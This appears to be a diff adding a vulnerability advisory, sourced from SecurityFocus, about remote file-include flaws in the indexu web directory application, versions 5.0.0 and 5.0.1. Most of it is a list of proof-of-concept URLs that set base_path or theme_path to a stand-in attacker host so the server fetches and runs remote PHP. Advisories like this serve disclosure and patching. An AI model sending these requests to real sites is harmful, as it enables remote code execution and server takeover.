@@ -1,0 +1,35 @@
+source: http://www.securityfocus.com/bid/17470/info
+
+The 'indexu' application is prone to multiple remote file-include vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker can exploit these issues to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.
+
+These issues are reported to affect versions 5.0.0 and 5.0.1; other versions may also be vulnerable.
+
+http://www.example.com/indexu/invoice.php?base_path=http://evil.txt?cmd?cmd
+http://www.example.com/indexu/index.php?theme_path=http://evil.txt?cmd
+http://www.example.com/indexu/become_editor.php?theme_path=http://evil.txt?cmd
+http://www.example.com/indexu/add.php?theme_path=http://evil.txt?cmd
+http://www.example.com/indexu/bad_link.php?theme_path=http://evil.txt
+http://www.example.com/indexu/browse.php?theme_path=http://evil.txt?cmd
+http://www.example.com/indexu/detail.php?theme_path=http://evil.txt?cmd
+http://www.example.com/indexu/fav.php?theme_path=http://evil.txt?cmd
+http://www.example.com/indexu/get_rated.php?theme_path=http://evil.txt?cmd
+http://www.example.com/indexu/login.php?theme_path=http://evil.txt?cmd
+http://www.example.com/indexu/mailing_list.php?theme_path=http://evil.txt?cmd
+http://www.example.com/indexu/new.php?theme_path=http://evil.txt?cmd
+http://www.example.com/indexu/modify.php?theme_path=http://evil.txt?cmd
+http://www.example.com/indexu/pick.php?theme_path=http://evil.txt?cmd
+http://www.example.com/indexu/power_search.php?theme_path=http://evil.txt?cmd
+http://www.example.com/indexu/rating.php?theme_path=http://evil.txt?cmd
+http://www.example.com/indexu/rating.php?theme_path=http://evil.txt?cmd?cmd
+http://www.example.com/indexu/register.php?theme_path=http://evil.txt?cmd?cmd
+http://www.example.com/indexu/review.php?theme_path=http://evil.txt?cmd?cmd
+http://www.example.com/indexu/rss.php?theme_path=http://evil.txt?cmd?cmd
+http://www.example.com/indexu/search.php?theme_path=http://evil.txt?cmd?cmd
+http://www.example.com/indexu/send_pwd.php?theme_path=http://evil.txt?cmd?cmd
+http://www.example.com/indexu/sendmail.php?theme_path=http://evil.txt?cmd?cmd
+http://www.example.com/indexu/tell_friend.php?theme_path=http://evil.txt?cmd?cmd
+http://www.example.com/indexu/top_rated.php?theme_path=http://evil.txt?cmd?cmd
+http://www.example.com/indexu/user_detail.php?theme_path=http://evil.txt?cmd?cmd
+http://www.example.com/indexu/user_search.php?theme_path=http://evil.txt?cmd?cmd
